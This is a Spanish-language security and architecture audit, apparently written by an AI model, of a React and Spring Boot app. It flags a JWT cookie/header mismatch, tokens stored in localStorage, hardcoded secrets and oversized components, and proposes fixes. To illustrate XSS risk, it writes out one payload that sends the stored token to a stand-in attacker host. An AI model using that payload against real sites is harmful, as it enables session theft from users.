# REPORTE DE AUDITORÍA: CLAUDE CODE
**Fecha de Análisis:** 17 de Diciembre, 2025  
**Auditor:** Claude (Sonnet 4.5) - Senior Solutions Architect  
**Alcance:** Full-Stack (React + Vite + Spring Boot)

---

## 1. RESUMEN EJECUTIVO

**Estado de Salud General: 4/10** ⚠️

Esta aplicación presenta **vulnerabilidades críticas de seguridad** y una **desconexión arquitectónica fundamental** entre frontend y backend que la hace insegura para producción. El código muestra características de un prototipo que ha crecido sin refactorización, con el "molde" heredado actuando más como deuda técnica que como fundamento sólido.

**Hallazgo más crítico:** El backend está configurado para autenticación basada en cookies (`JwtAuthorizationFilter` lee `Cookie jwtCookie`), pero el frontend envía tokens JWT en headers `Authorization: Bearer`. **Esto significa que la autenticación real probablemente no está funcionando como debería**, y cualquier protección de rutas es probablemente superficial.

---

## 2. HALLAZGOS CRÍTICOS (Riesgo Inmediato)

### 🔴 CRÍTICO 1: Desconexión Autenticación Frontend-Backend
**Archivo:** `JwtAuthorizationFilter.java:29` vs `api.ts:32`

```java
// BACKEND espera esto:
Cookie jwtCookie = WebUtils.getCookie(request, "jwt");
```

```typescript
// FRONTEND envía esto:
config.headers.Authorization = `Bearer ${token}`;
```

**Impacto:** El filtro JWT del backend **nunca recibe el token** porque busca en cookies y el frontend lo envía en headers. Esto significa:
- Las rutas "protegidas" probablemente están abiertas si hay rutas públicas alternativas
- El usuario puede estar navegando como "autenticado" en el frontend pero "anónimo" en el backend
- Los logs del backend mostrarán `null` para username en cada request

**Acción Requerida:** Elegir UNA estrategia (cookies HttpOnly o Bearer header) y alinear ambos lados.

---

### 🔴 CRÍTICO 2: Almacenamiento Masivo en localStorage (14 instancias)
**Archivos afectados:**
- `AuthContext.tsx` (token + user object completo con rol)
- `ProductContext.tsx` (estado de negocio completo)
- `ThemeContext.tsx` (tema, menos crítico)

**Vulnerabilidades identificadas:**

1. **XSS = Session Hijacking Total:**
```typescript
localStorage.setItem('token', token);
localStorage.setItem('user', JSON.stringify(user)); // Incluye rol
```
Un simple XSS (`<img src=x onerror="fetch('https://evil.com?data='+localStorage.getItem('token'))">`)) exfiltra la sesión completa.

2. **Manipulación de Roles:**
```typescript
// Cualquier script puede hacer:
localStorage.setItem('user', JSON.stringify({...user, role: 'ROLE_ADMIN'}));
```
Aunque el backend valide, la UI se engaña mostrando opciones de admin a usuarios normales.

3. **ProductContext: 43 Líneas de Estado de Negocio en localStorage:**
```typescript
const initialState = JSON.parse(localStorage.getItem('GlobalContext')) || {
    carrito: [], pedido: {}, usuario: null
};
```
Esto convierte localStorage en una "base de datos" del lado cliente. Si un usuario borra localStorage, **pierde su carrito/pedido**.

---

### 🔴 CRÍTICO 3: Zero Runtime Validation (Type Safety es una Ilusión)
**Archivo:** `api.ts` (líneas 32-165)

```typescript
getPlantas: async (): Promise<PlantaDto[]> => {
    const response = await api.get('/api/plantas');
    return response.data; // ❌ Blind cast
}
```

**Problema:** Si el backend devuelve `{plantas: [...]}` en lugar de `[...]`, o cambia `nombre` → `name`, el frontend explota silenciosamente. Los tipos TypeScript son **solo en tiempo de compilación**, no protegen contra:
- Cambios en la API del backend
- Respuestas malformadas de red
- Ataques de intermediario que modifican respuestas

**Evidencia de fragilidad:** El historial del proyecto muestra múltiples crashes por `undefined is not an object` cuando campos no existen.

---

### 🟠 ALTO 4: Secretos Hardcodeados en Control de Versiones
**Archivo:** `application.properties:9-11,27-28,39`

```properties
spring.datasource.password=password
minio.access.key=minioadmin
minio.secret.key=minioadmin
jwt.secret=asupersecretkeythatisverylongandsecure
```

**Riesgo:** Cualquier commit histórico de este archivo (incluso si luego se "arregla") **expone las credenciales para siempre** en el historial de Git. Atacantes usan herramientas como `truffleHog` para escanear repos públicos/privados buscando exactamente esto.

---

## 3. ANÁLISIS DE ARQUITECTURA

### Diagrama Conceptual del Flujo de Datos (Estado Actual)

```
┌─────────────────────────────────────────────────┐
│  FRONTEND (React + Vite)                        │
├─────────────────────────────────────────────────┤
│  localStorage                                    │
│  ├─ token (JWT)               ← XSS vulnerable  │
│  ├─ user {id, role, email}    ← Manipulable     │
│  └─ GlobalContext {carrito}   ← Business logic  │
│                                                  │
│  api.ts (Monolith)                              │
│  └─ axios.interceptor → Authorization: Bearer   │
│                            ↓                     │
└────────────────────────────┼────────────────────┘
                             │ HTTP Request
                             ↓
┌────────────────────────────┼────────────────────┐
│  BACKEND (Spring Boot)     ↓                    │
├─────────────────────────────────────────────────┤
│  JwtAuthorizationFilter                         │
│  └─ getCookie("jwt") → ❌ NULL (frontend no lo  │
│                           envía como cookie)     │
│                                                  │
│  SecurityContextHolder → Usuario = ANONYMOUS    │
│  ↓                                               │
│  @PreAuthorize("hasRole(...)") → ⚠️ Bypass?    │
└─────────────────────────────────────────────────┘
```

**Falla Fundamental:** Hay dos "mundos paralelos":
1. Frontend cree que está autenticado (localStorage tiene token)
2. Backend ve requests anónimos (cookie vacía)

---

### God Components Detectados

#### 1. `Index.tsx` (549 líneas) - Landing Page Monstruo
```typescript
// Define 14 componentes inline:
const SectionTitle = ... // Línea 43
const FeaturePill = ...   // Línea 57
const HeroSection = ...   // Línea 149
const FeaturesSection = ... // etc.
```

**Problema:** Esto NO es componentización, es un archivo monolítico disfrazado. Cada componente debería estar en su propio archivo. Si mañana quiero usar `FeaturePill` en otra página, tengo que copiar-pegar o importar TODO `Index.tsx`.

**Deuda técnica:** 
- 0% reutilización de código
- Testing imposible (¿cómo hago un test unitario de `HeroSection` si está dentro de `Index`?)
- Violación de Single Responsibility Principle

#### 2. `Dashboard.tsx` (312 líneas) - Business Logic en UI
```typescript
const { availableRooms, filteredAndGroupedPlantas, kpis } = useMemo(() => {
    // 33 líneas de lógica de negocio
    const uniqueRooms = ['Todas', ...Array.from(new Set(...))];
    const filtered = plantas.filter(...); // Filtrado
    const grouped = filtered.reduce(...); // Agrupamiento
    const calculatedKpis = [...];         // Cálculos
    return { ... };
}, [plantas, searchQuery, filterEtapa, filterSala]);
```

**Anti-patrón:** Esta lógica debería estar en un hook `useDashboardLogic.ts` o en el backend. El componente debe ser "tonto" (presentacional).

---

## 4. LISTA DE "REFACTORIZACIÓN OBLIGATORIA"

### Semana 1 (Seguridad Crítica)
**Prioridad MÁXIMA - No opcional para producción:**

1. **[DÍA 1] Alinear Autenticación:**
   - **Opción A (Recomendada):** Modificar backend para aceptar `Authorization: Bearer` en lugar de cookies.
   - **Opción B:** Modificar frontend para usar cookies HttpOnly (requiere cambio en `/login` endpoint).
   - **Verificación:** Test manual: `curl -H "Authorization: Bearer <token>" http://localhost:8080/api/plantas` debe retornar datos.

2. **[DÍA 2-3] Migrar Autenticación de localStorage:**
```typescript
// ❌ ELIMINAR:
localStorage.setItem('token', token);

// ✅ IMPLEMENTAR una de estas:
// Opción 1: HttpOnly Cookies (más seguro)
// Opción 2: SessionStorage + Token Refresh en memoria
// Opción 3: Encrypted IndexedDB con rotación de keys
```

3. **[DÍA 4] Externalizar Secretos Backend:**
```bash
# Crear archivo .env (NO commitear)
DB_PASSWORD=<from_secrets_manager>
JWT_SECRET=<from_secrets_manager>
MINIO_KEY=<from_secrets_manager>
```
```properties
# application.properties
spring.datasource.password=${DB_PASSWORD}
jwt.secret=${JWT_SECRET}
```

---

### Semana 2 (Robustez Arquitectónica)

4. **Implementar Validación en Runtime con Zod:**
```typescript
import { z } from 'zod';

const PlantaDtoSchema = z.object({
    id: z.number(),
    nombre: z.string(),
    etapa: z.enum(['GERMINACION', 'PLANTIN', ...]),
    // ...
});

getPlantas: async () => {
    const response = await api.get('/api/plantas');
    return PlantaDtoSchema.array().parse(response.data); // ✅ Valida en runtime
}
```

5. **Atomizar `Index.tsx`:**
```
src/
  components/
    landing/
      HeroSection.tsx
      FeaturesSection.tsx
      BlogSection.tsx
      ...
  pages/
    Index.tsx (solo orquesta componentes, <100 líneas)
```

6. **Extraer Lógica de Dashboard:**
```typescript
// src/hooks/useDashboardLogic.ts
export const useDashboardLogic = (plantas, filters) => {
    return useMemo(() => ({
        availableRooms: computeRooms(plantas),
        filteredAndGroupedPlantas: filterAndGroup(plantas, filters),
        kpis: calculateKpis(plantas)
    }), [plantas, filters]);
};
```

---

## 5. VEREDICTO DEL ARQUITECTO

### Diagnóstico Sin Filtros

Este código es el resultado de **desarrollo bajo presión sin tiempo para refactorizar**. El "molde" heredado (Context API manual, localStorage, reducers) está **obsoleto para 2025** y choca con las herramientas modernas que se intentan usar (TanStack Query, Zod conceptual).

**Metáfora:** Es como construir un edificio moderno con cimientos de los años 90. Funciona mientras no escale, pero:
- **Seguridad:** La autenticación está "simulada", no real.
- **Escalabilidad:** 14 accesos a localStorage significan inconsistencias garantizadas.
- **Mantenimiento:** Un cambio en el backend requiere buscar en 20 archivos del frontend.

### Estado Real de la Aplicación

**❌ No está lista para producción.**  
**⚠️ No está lista ni para un beta público.**  
**✅ Está lista para... refactorización intensiva.**

### Estimación de Deuda Técnica

- **Horas para arreglar seguridad crítica:** 16-24h (1 dev)
- **Horas para refactorizar arquitectura:** 40-60h (1 dev senior)
- **Costo de NO arreglarlo:** 
  - XSS → Pérdida de datos de usuarios
  - Autenticación rota → Brechas de acceso no autorizado
  - God Components → Velocidad de desarrollo -50% en 3 meses

### Recomendación Final

**STOP. No agregar más features.**  
Dedicar **2 sprints completos** (4 semanas) a:
1. Arreglar autenticación (frontend ↔ backend)
2. Eliminar localStorage para datos sensibles
3. Implementar validación Zod
4. Atomizar God Components

**Después** de esto, el proyecto tendrá una base sólida. Intentar escalar sobre la base actual es como construir un rascacielos en arena.

---

**Firmado Digitalmente:**  
Claude (Sonnet 4.5) - Solutions Architect  
Auditoría realizada bajo estándares OWASP y principios SOLID
